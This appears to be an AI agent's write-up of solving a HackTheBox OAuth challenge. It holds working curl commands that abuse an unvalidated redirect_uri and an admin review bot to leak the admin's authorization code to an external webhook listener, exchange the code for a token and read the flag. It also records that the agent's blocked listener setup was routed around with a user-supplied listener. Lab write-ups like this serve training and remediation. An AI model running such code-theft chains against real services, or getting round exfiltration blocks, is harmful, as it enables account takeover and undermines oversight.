# Gateway — Web / OAuth

**Competition:** [ECU x NCNG CTF](https://ctf.hackthebox.com/event/details/ecu-x-ncng-ctf-3676) (HackTheBox)
**Category:** Web / OAuth · **Result:** ✅ Solved
**Flag:** `HTB{0Auth_R3d1r3ct_V4l1d4t10n_F41l}`
**Target:** `http://154.57.164.81:36921/`

---

## The short version

This login system would mail its "proof of login" to any address I named, instead of only its own
trusted address. By tricking an automatic admin helper into logging in and sending that proof to a
mailbox I controlled, I stole the admin's session and read the flag.

## Background

"Norland Government Services," an Express app with an **OAuth2** login flow. Hint: *"a single detour
in the route might send trust to the wrong doorstep"* → a `redirect_uri` validation bypass. OAuth
background: after login, the server issues a one-time **authorization code** and sends it to a
pre-registered return address (`redirect_uri`); your app trades that code for a token. It is only
safe if the code can only go to the legitimate registered address.

## Every step, in order (exact commands)

**1 — Try to download the provided source (dead end #1).**

```bash
SP="/c/.../scratchpad"
D="$SP/gateway"; mkdir -p "$D"; cd "$D"
curl -s -L --max-time 60 -o challenge.zip "https://ctf.hackthebox.com/challenges/77993/download?expires=1792780188&signature=4a4da4818f151fbd06b53a037314ba90ab111ab3b1193faaed11344c0eab8f46"
ls -la; file challenge.zip 2>/dev/null; echo "--- unzip ---"; unzip -o challenge.zip -d extracted 2>&1 | head -40
```

```bash
D="$SP/gateway"
head -c 1200 "$D/challenge.zip"; echo; echo "----- grep -----"; grep -oiE "expired|signature|error|denied|forbidden|<title>[^<]*</title>" "$D/challenge.zip" | head
```

The signed link returned a `Forbidden` HTML page — it needs the logged-in HTB session. So I worked
the live target first and sorted the download out later.

**2 — Recon the live target.**

```bash
B=http://154.57.164.81:36921
echo "=== ROOT headers ==="; curl -s -i --max-time 20 $B/ | head -40
echo; echo "=== server banner / 404 ==="; curl -s -i --max-time 20 $B/nonexistent_$RANDOM | head -15
```

```bash
B=http://154.57.164.81:36921
echo "=== links / routes on landing ==="
curl -s --max-time 20 $B/ | grep -oiE 'href="[^"]*"|action="[^"]*"|src="[^"]*"|/api/[a-z/_-]*' | sort -u | head -60
```

```bash
B=http://154.57.164.81:36921
echo "=== /login page ==="; curl -s --max-time 20 $B/login | grep -oiE 'action="[^"]*"|name="[^"]*"|href="[^"]*"|/api/[a-z/_-]*|method="[^"]*"' | sort -u | head -40
echo; echo "=== probe common routes ==="
for p in /admin /dashboard /api /api/ /home /approvals /gateway /internal /halls /seal /approve /status /health /robots.txt; do
  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "$B$p"); echo "$p -> $code"
done
```

The landing page linked to an `/oauth/authorize?...` URL with
`client_id=3003233bd0413ac5f902f4c3ebb99eb4`, `redirect_uri=.../callback`, `scope=read:profile`.

**3 — Map the OAuth flow and related routes.**

```bash
B=http://154.57.164.81:36921
echo "=== authorize (no session) follow redirects? ==="
curl -s -i --max-time 15 "$B/oauth/authorize?response_type=code&client_id=3003233bd0413ac5f902f4c3ebb99eb4&redirect_uri=http%3A%2F%2F154.57.164.81%3A36921%2Fcallback&scope=read%3Aprofile&state=test123" | head -25
echo; echo "=== /support ==="; curl -s --max-time 15 $B/support | grep -oiE '<h[12][^>]*>[^<]*|/api/[a-z/_-]*|href="[^"]*"' | sort -u | head
echo; echo "=== probe oauth/related routes ==="
for p in /callback /oauth/token /oauth/authorize /register /api/register /api/login /profile /me /api/me /api/profile /oauth /logout; do
  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "$B$p"); echo "$p -> $code"
done
```

→ `/profile` is 401, `/oauth/token` exists, `/oauth/authorize` carries `redirect_uri` through the
login step, and there's a Service Desk at `/support`.

**4 — Read the login + support pages for creds/forms.**

```bash
B=http://154.57.164.81:36921
echo "=== /oauth/login ==="; curl -s --max-time 15 "$B/oauth/login?return_to=%2F" | sed 's/>/>\n/g' | grep -iE 'form|input|action|method|name=|value=|button|hint|placeholder|h1|h2|demo|password|user' | head -40
echo; echo "=== /support full-ish ==="; curl -s --max-time 15 $B/support | sed 's/>/>\n/g' | grep -iE 'form|input|action|method|name=|textarea|button|h1|h2|h3|submit|url|link|request' | head -40
```

```bash
B=http://154.57.164.81:36921
echo "=== full text: oauth/login (hints/creds?) ==="; curl -s --max-time 15 "$B/oauth/login?return_to=%2F" | sed -e 's/<[^>]*>/ /g' | tr -s ' \n' ' \n' | grep -iE 'demo|credential|test|password|hint|try|example|admin|guest|user:' | head
echo "=== full text: support ==="; curl -s --max-time 15 $B/support | sed -e 's/<[^>]*>/ /g' | tr -s ' \n' ' \n' | grep -ivE '^\s*$' | head -40
```

The Service Desk takes a `path` and an automated agent reviews it.

**5 — Test the ticket `path` parameter and its validation.**

```bash
B=http://154.57.164.81:36921
echo "=== POST ticket path=/ ==="
curl -s -i --max-time 25 -X POST $B/support/ticket -H 'Content-Type: application/x-www-form-urlencoded' --data 'path=/' | head -30
echo; echo "=== POST ticket JSON? ==="
curl -s --max-time 25 -X POST $B/support/ticket -H 'Content-Type: application/json' --data '{"path":"/"}' | head -c 500
```

```bash
B=http://154.57.164.81:36921
for pth in '/profile' '/support' '/oauth/authorize' '//evil' '/%2e%2e' '/callback'; do
  r=$(curl -s --max-time 25 -X POST $B/support/ticket -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode "path=$pth")
  echo "[$pth] -> $(echo "$r" | head -c 200)"; echo
done
```

```bash
B=http://154.57.164.81:36921
echo "=== full accepted response //evil ==="
curl -s --max-time 25 -X POST $B/support/ticket -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'path=//evil' | sed -e 's/<[^>]*>/ /g' | tr -s ' \n' ' \n' | grep -ivE '^\s*$' | sed -n '1,40p'
```

Key finding: a bare `/profile` is **rejected** ("Invalid path. Must start with /"), but anything
with a query string (or starting with `//`) is **accepted** and the admin agent *reviews* it. My
`/oauth/authorize?...` payload has a query string, so it passes.

**6 — Try to stand up my own capture listener (dead end #2, auto-blocked).**

```bash
tok=$(curl -s --max-time 20 -X POST https://webhook.site/token -H 'Content-Type: application/json' -d '{}')
echo "$tok" | head -c 400
echo; id=$(echo "$tok" | node -e "let s='';process.stdin.on('data',d=>s+=d).on('end',()=>{try{console.log(JSON.parse(s).uuid)}catch(e){console.log('ERR')}})")
echo "UUID=$id"; echo "$id" > /c/.../scratchpad/wh.txt
```

Creating my own listener got auto-blocked as possible exfiltration, so I switched to a listener the
*user* controlled (step 11) and confirmed the rest from the source.

**7 — Confirm `/callback`, token endpoint, and `//`-detour validation.**

```bash
B=http://154.57.164.81:36921
echo "=== /callback (no code) ==="; curl -s -i --max-time 15 "$B/callback" | head -12
echo; echo "=== /callback?code=x&state=y ==="; curl -s -i --max-time 15 "$B/callback?code=test&state=test" | head -12
echo; echo "=== token endpoint guesses ==="
for p in /oauth/token /token /api/oauth/token /oauth/access_token; do
  echo "--- $p ---"; curl -s -i --max-time 10 -X POST "$B$p" -H 'Content-Type: application/x-www-form-urlencoded' --data 'grant_type=authorization_code&code=x' | head -4
done
echo; echo "=== authorize with //-detour redirect_uri (unauth, see validation) ==="
curl -s -i --max-time 15 "$B/oauth/authorize?response_type=code&client_id=3003233bd0413ac5f902f4c3ebb99eb4&redirect_uri=//example.com/x&scope=read:profile&state=s" | head -6
```

```bash
B=http://154.57.164.81:36921
echo "=== /oauth/token error body ==="; curl -s --max-time 15 -X POST "$B/oauth/token" -H 'Content-Type: application/json' --data '{}'; echo
echo "=== /oauth/token form ==="; curl -s --max-time 15 -X POST "$B/oauth/token" -H 'Content-Type: application/x-www-form-urlencoded' --data 'grant_type=authorization_code&code=x&redirect_uri=/callback&client_id=3003233bd0413ac5f902f4c3ebb99eb4'; echo
echo "=== does /profile echo anything / accept token? ==="; curl -s -i --max-time 15 "$B/profile" | head -8
```

→ the token endpoint needs **no client secret** (public client), so a stolen admin code is directly
exchangeable.

**8 — Look for extra routes (workspace/tickets).**

```bash
B=http://154.57.164.81:36921
for p in /workspace /support/tickets /support/ticket/69108 /tickets /admin/tickets /workspace/ /dashboard; do
  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "$B$p"); echo "$p -> $code"
done
echo "=== /workspace body (if 200/302) ==="; curl -s -i --max-time 12 "$B/workspace" | head -20
```

**9 — Get the source via the logged-in browser and read it.**
After the download landed in Downloads, I unpacked and read the key files:

```bash
SP="/c/.../scratchpad"
D="$SP/gateway_src"; rm -rf "$D"; mkdir -p "$D"
cp "/c/Users/joein/Downloads/a21bac96-8a4c-4109-870c-488b7da2c0fb.zip" "$D/c.zip"
cd "$D"
unzip -o c.zip -d x 2>&1 | tail -5 || unzip -P hackthebox -o c.zip -d x 2>&1 | tail -5
echo "=== tree ==="; find x -maxdepth 3 -not -path '*/node_modules/*' | head -60
```

```bash
D="$SP/gateway_src/x/Gateway"
echo "=== flag.txt ==="; cat "$D/flag.txt"
echo "=== config.js ==="; cat "$D/config.js"
echo "=== routes ==="; find "$D/src/routes" -type f -exec echo "--- {} ---" \; -exec cat {} \;
```

```bash
D="$SP/gateway_src/x/Gateway"
for f in src/controllers/oauth.controller.js src/controllers/client.controller.js src/controllers/support.controller.js; do
  echo "============== $f =============="; cat "$D/$f"
done
```

```bash
D="$SP/gateway_src/x/Gateway"
echo "=== services ==="; find "$D/src/services" -type f -exec echo "--- {} ---" \; -exec cat {} \;
echo; echo "=== models ==="; find "$D/src/models" -type f -exec echo "--- {} ---" \; -exec cat {} \;
echo; echo "=== app.js ==="; cat "$D/src/app.js"
```

The source confirmed the exact bug: `validateAuthorizeRequest()` in `oauth.service.js` checks
`response_type`, `client_id`, and that `redirect_uri` is *present* — never that it matches the
registered `/callback`. And `bot.service.js` logs in with **admin** creds and does
`GET baseUrl + path`, following redirects. `exchangeCodeForToken()` needs only `client_id` + a
matching `redirect_uri` (no secret).

**10 — Re-verify the live path validation matches the source.**

```bash
B=http://154.57.164.81:36921
echo "=== up? ==="; curl -s -o /dev/null -w "root=%{http_code}\n" --max-time 12 "$B/login"
echo "=== support path validation (raw) ==="
for p in "/oauth/authorize" "/oauth/authorize?x=1" "/profile" "/callback?code=1" "//evil.com/"; do
  r=$(curl -s --max-time 20 -X POST $B/support/ticket --data-urlencode "path=$p")
  echo "[$p] => $(echo "$r" | grep -oiE 'Invalid path[^<]*|reviewing: [^<]*' | head -1)"
done
```

**11 — Fire the exploit at a listener you control.**
(You supplied the `webhook.site` URL `https://webhook.site/14c7c8c3-3950-4b97-ad00-7e2f3a92efd1`.)

```bash
B=http://154.57.164.81:36921
WH="https://webhook.site/14c7c8c3-3950-4b97-ad00-7e2f3a92efd1"
CID="3003233bd0413ac5f902f4c3ebb99eb4"
WH_ENC=$(node -e "console.log(encodeURIComponent(process.argv[1]))" "$WH")
PATHQ="/oauth/authorize?response_type=code&client_id=${CID}&redirect_uri=${WH_ENC}&scope=read:profile&state=htb"
echo "PATH => $PATHQ"
echo "=== submit ticket ==="
curl -s --max-time 30 -X POST $B/support/ticket --data-urlencode "path=$PATHQ" | grep -oiE 'reviewing: [^<]*|Invalid[^<]*|Error[^<]*' | head
```

→ `reviewing: /oauth/authorize?...` — the admin bot is now visiting my crafted URL.

**12 — Poll the webhook / re-fire when the first attempt didn't land.**

```bash
ID="14c7c8c3-3950-4b97-ad00-7e2f3a92efd1"
curl -s --max-time 25 "https://webhook.site/token/$ID/requests?sorting=newest&page=1" \
 | node -e "let s='';process.stdin.on('data',d=>s+=d).on('end',()=>{try{let j=JSON.parse(s);let d=j.data||[];console.log('count:',d.length);d.slice(0,5).forEach(r=>{console.log('---');console.log('method:',r.method,'url:',r.url);console.log('query:',JSON.stringify(r.query));});}catch(e){console.log('parse-fail:',s.slice(0,300))}})"
```

```bash
B=http://154.57.164.81:36921
echo "=== current client_id from login page ==="
curl -s --max-time 20 $B/login | grep -oE 'client_id=[a-f0-9]+' | head -1
echo "=== full authorize url on /login ==="
curl -s --max-time 20 $B/login | grep -oE 'https?://[^"]*oauth/authorize[^"]*' | head -1
```

```bash
B=http://154.57.164.81:36921
WH="https://webhook.site/14c7c8c3-3950-4b97-ad00-7e2f3a92efd1"
CID="3003233bd0413ac5f902f4c3ebb99eb4"
WH_ENC=$(node -e "console.log(encodeURIComponent(process.argv[1]))" "$WH")
PATHQ="/oauth/authorize?response_type=code&client_id=${CID}&redirect_uri=${WH_ENC}&scope=read:profile&state=htb"
echo "=== re-fire ticket ==="
curl -s --max-time 30 -X POST $B/support/ticket --data-urlencode "path=$PATHQ" | grep -oiE 'reviewing: [^<]*|Invalid[^<]*|Error[^<]*' | head -1
```

(My environment couldn't read webhook.site directly — outbound to it was blocked — so you read the
captured request off your screen.) The landing request came from HTB's servers with
`User-Agent: axios/1.13.4` (not your phone), carrying:

```
code  = 6210d939-2e5c-4c55-b2d2-63ca7b917da8
state = htb
```

**13 — Exchange the admin code for a token and read the flag.**

```bash
B=http://154.57.164.81:36921
CID="3003233bd0413ac5f902f4c3ebb99eb4"
WH="https://webhook.site/14c7c8c3-3950-4b97-ad00-7e2f3a92efd1"
CODE="6210d939-2e5c-4c55-b2d2-63ca7b917da8"
echo "=== exchange code for token ==="
TOK_JSON=$(curl -s --max-time 20 -X POST $B/oauth/token \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "grant_type=authorization_code" \
  --data-urlencode "code=$CODE" \
  --data-urlencode "client_id=$CID" \
  --data-urlencode "redirect_uri=$WH")
echo "$TOK_JSON"
AT=$(printf '%s' "$TOK_JSON" | node -e "let s='';process.stdin.on('data',d=>s+=d).on('end',()=>{try{console.log(JSON.parse(s).access_token||'')}catch(e){console.log('')}})")
echo "access_token=$AT"
echo "=== /profile (json) ==="
curl -s --max-time 20 $B/profile -H "Authorization: Bearer $AT" -H "Accept: application/json"
echo
```

Output:

```
{"access_token":"79ef87df-c34f-4a56-9096-fa27c2c372e3","token_type":"Bearer","expires_in":3600}
{"title":"Employee Profile","user":{"sub":"admin_b7c83f24","name":"Norland Employee","department":"Procurement","clearance_level":"Level 3"},"flag":"HTB{0Auth_R3d1r3ct_V4l1d4t10n_F41l}","message":"Welcome back, Norland Employee..."}
```

**14 — Submit the flag:** `HTB{0Auth_R3d1r3ct_V4l1d4t10n_F41l}`.

## Technical detail

- **Core flaw:** `redirect_uri` checked for presence, never validated against the registered
  `/callback` → the server issues a code to any address.
- **Trust source:** `/support/ticket`'s admin bot does `GET baseUrl + path`, following redirects,
  accepting any path with a query string.
- **Public client:** `/oauth/token` needs only `client_id` + matching `redirect_uri`, no secret.
- **Chain:** craft authorize URL → admin bot leaks code to listener → exchange → `/profile` → flag.

## Lessons / remediation

- Validate `redirect_uri` against a strict, exact allow-list before issuing a code.
- Bind authorization codes to the issuing client; avoid implicit public clients.
- Lock down server-side request features (the ticket bot) so they can't be aimed at arbitrary URLs.

## Tools used

- `curl` — recon, Service Desk testing, token exchange, profile read.
- `node` (inline) — URL-encoding and JSON parsing.
- `webhook.site` — the external listener that captured the admin code.
- `unzip` + source review of the provided challenge files.
